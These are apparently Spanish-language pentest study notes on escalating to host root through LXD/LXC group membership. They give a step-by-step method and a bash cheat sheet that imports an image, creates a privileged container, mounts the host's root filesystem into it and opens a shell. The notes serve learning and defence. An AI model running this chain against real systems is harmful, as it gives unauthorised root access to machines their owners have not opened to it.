---
tags:
  - linux
  - privex
  - container
---
## Conceptos Clave (TL;DR)
* Los contenedores operan a nivel del sistema operativo, compartiendo el kernel del sistema anfitrión pero aislando los procesos de las aplicaciones.
* A diferencia de los contenedores de aplicaciones tradicionales, Linux Daemon (LXD) es un contenedor de sistema diseñado para albergar un sistema operativo completo.
* La escalada de privilegios se logra aprovechando configuraciones inseguras y deshabilitando las características de aislamiento del contenedor para acceder al sistema anfitrión.

## Herramientas Clave
* **id**: Utilizada para verificar si el usuario actual pertenece a los grupos lxc o lxd.
* **lxc**: La interfaz de línea de comandos principal para gestionar contenedores, importar imágenes y configurar los parámetros de seguridad.

## Metodología Paso a Paso
1. **Verificación de Permisos**: Antes de intentar la escalada, es obligatorio confirmar que el usuario comprometido pertenece al grupo `lxc` o `lxd`.
2. **Localización o Creación de Imagen**: Se necesita un contenedor o plantilla (template) para importar, que frecuentemente se puede encontrar en entornos de prueba sin seguridad adecuada.
3. **Importación de la Imagen**: El archivo de la plantilla debe ser importado como una imagen dentro del ecosistema LXC del objetivo.
4. **Inicialización y Configuración**: Se crea el contenedor desactivando las funciones de aislamiento mediante la bandera `security.privileged`. Esto permite interactuar directamente con el anfitrión.
5. **Montaje del Disco Anfitrión**: Se añade un dispositivo virtual al contenedor que monta el directorio raíz (`/`) del anfitrión en una ruta específica dentro del contenedor.
6. **Ejecución y Acceso**: Se inicia el contenedor y se ejecuta una shell en su interior para acceder a los archivos del sistema anfitrión con privilegios de root.

## Cheat Sheet de Comandos
```bash
# Verifica los grupos del usuario actual para confirmar membresía en lxd o lxc 
id

# Importa el archivo del contenedor como una imagen local y le asigna un alias 
lxc image import <IMAGE_FILE> --alias <ALIAS_NAME>

# Lista las imágenes disponibles para confirmar que la importación fue exitosa 
lxc image list

# Inicializa el contenedor usando el alias, y establece security.privileged=true para deshabilitar el aislamiento 
lxc init <ALIAS_NAME> <CONTAINER_NAME> -c security.privileged=true

# Añade un dispositivo al contenedor que monta la raíz del host (source=/) en un directorio del contenedor (path=<MOUNT_PATH>) 
lxc config device add <CONTAINER_NAME> <DEVICE_NAME> disk source=/ path=<MOUNT_PATH> recursive=true

# Inicia el contenedor malicioso 
lxc start <CONTAINER_NAME>

# Ejecuta una shell (bash) dentro del contenedor activo para interactuar con los archivos montados 
lxc exec <CONTAINER_NAME> /bin/bash
```

## "Gotchas" y Troubleshooting
* **Requisito indispensable**: El exploit no funcionará si el usuario comprometido no está dentro del grupo `lxc` o `lxd`.
* **Plantillas inseguras**: Es común que los administradores utilicen plantillas de prueba sin contraseñas u otras medidas de seguridad para acelerar el despliegue de los entornos, lo que facilita obtener una imagen inicial válida.
* **Bandera de aislamiento**: Si no se declara explícitamente la bandera `security.privileged=true` durante la inicialización, el aislamiento de procesos seguirá activo y no será posible afectar o escalar privilegios hacia el sistema anfitrión.